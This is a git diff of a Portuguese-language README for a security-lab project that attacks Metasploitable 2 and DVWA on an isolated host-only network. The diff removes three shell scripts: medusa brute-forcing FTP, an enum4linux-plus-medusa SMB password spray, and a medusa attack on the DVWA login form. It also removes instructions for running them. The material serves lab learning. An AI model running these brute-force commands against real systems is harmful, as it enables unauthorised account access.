@@ -99,47 +99,11 @@ meu-projeto-seguranca/
 ├── wordlists/
 │   ├── users.txt
 │   ├── passwords.txt
-├── scripts/
-│   ├── ftp_bruteforce.sh
-│   ├── smb_spray.sh
-│   ├── dvwa_bruteforce.sh
 ├── images/
 │   ├── screenshot_ftp_success.png
 │   ├── screenshot_smb_enum.png
 │   ├── screenshot_dvwa_login.png
 ```
-
-### Scripts
-- `ftp_bruteforce.sh`:
-  ```bash
-  #!/bin/bash
-  medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 6
-  ```
-- `smb_spray.sh`:
-  ```bash
-  #!/bin/bash
-  enum4linux -U 192.168.56.101 > wordlists/users.txt
-  medusa -h 192.168.56.101 -U wordlists/users.txt -p password -M smbnt
-  ```
-- `dvwa_bruteforce.sh`:
-  ```bash
-  #!/bin/bash
-  medusa -h 192.168.56.101 -u admin -P wordlists/passwords.txt -M http -m DIR:/dvwa -m FORM:login.php -m FORM-DATA:"post?username=^USER^&password=^PASS^&Login=Login"
-  ```
-
-Torne os scripts executáveis:
-```bash
-chmod +x scripts/*.sh
-```
-
-## Como Executar
-1. Clone o repositório:
-   ```bash
-   git clone https://github.com/SEU_USUARIO/meu-projeto-seguranca.git
-   ```
-2. Configure as VMs (Kali Linux e Metasploitable 2) conforme descrito.
-3. Execute os scripts em `/scripts/` ou os comandos listados.
-
 ## Lições Aprendidas
 - A importância de wordlists bem elaboradas para ataques de força bruta.
 - A necessidade de configurar ambientes de teste isolados (rede host-only).
